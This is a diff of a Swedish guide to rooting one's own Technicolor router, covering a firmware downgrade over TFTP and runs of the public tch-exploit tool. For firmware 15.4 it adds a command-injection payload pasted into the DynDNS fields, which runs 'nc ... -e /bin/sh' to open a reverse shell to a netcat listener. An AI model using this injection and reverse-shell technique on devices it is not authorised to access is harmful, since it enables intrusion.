@@ -17,13 +17,22 @@ Skriver eftersom hur man gör.
 
 **Detta är för version > 18.1**
 
-~~Om du har version 17.1 gå **hit!**~~
-
-~~Om du har version 15.4 gå **hit!**~~
 
 Om du ska kunna roota routern måste vi lägga in en äldre programvara. **17.1** 
 
 ## Setup TFTP
+
+Du kan välja mellan t.ex:
+
+Kör du https://github.com/BoLaMN/tch-exploit/releases behövs bara det programmet både för TFTP och root.
+
+sudo ./tch-exploit-linux --ip="192.168.0.2 (din dators ipadress)" --tftp='sökväg till RBI'
+
+eller
+
+sudo ./tch-exploit-linux --eth="en0"--tftp='sökväg vill RBI'
+
+
 
 Först ladda ner TFTP så vi kan överföra programvaran.
 Download https://bitbucket.org/phjounin/tftpd64/downloads/Tftpd64-4.64-setup.exe
@@ -62,9 +71,36 @@ Nu när du har 17.1 skall du använda:
 
 https://github.com/BoLaMN/tch-exploit/releases
 
+Nätverkskabel ska in i WAN(röda porten) på routern. Och routern måste nollställas ifall den blivit använd på internet.
+
 Under Linux:
-./tch-exploit 
+
+./tch-exploit-linux
+
+![TCH-Exploit](images/tch1.png)
+
+Följ instruktionerna och byt IP till det som står.
+Efter en stund kommer det en massa text då får routern ett IP nummer. En stund senare kommer ännu mera text och va då beredd på att trycka
+på **WPS knappen** när det står att du ska göra det. 
+Sen är det bara att flytta nätverkskabeln till LAN på routern och logga in med SSH med användare "root" lösenord "root"
+
 
 Under Windows:
 
 Öppna en kommandotolk som Administratör.
+
+Gå till mappen där ni lagt filerna.
+
+Kör tch-exploit-win.exe
+
+## Version 15.4
+
+Du behöver installera netcat på windows ifall du inte kör linux.
+
+I en terminal skriv **nc -lvvp "port"**
+ 
+Logga in på routern gå till DynDNS:
+Klistra in detta på Domain,user,password slå på DynDNS och spara.
+**::::::'nc "Din dators IP" "porten du angav i terminalen" -e /bin/sh'**
+
+I din termninal kommer du nu få ett skal.
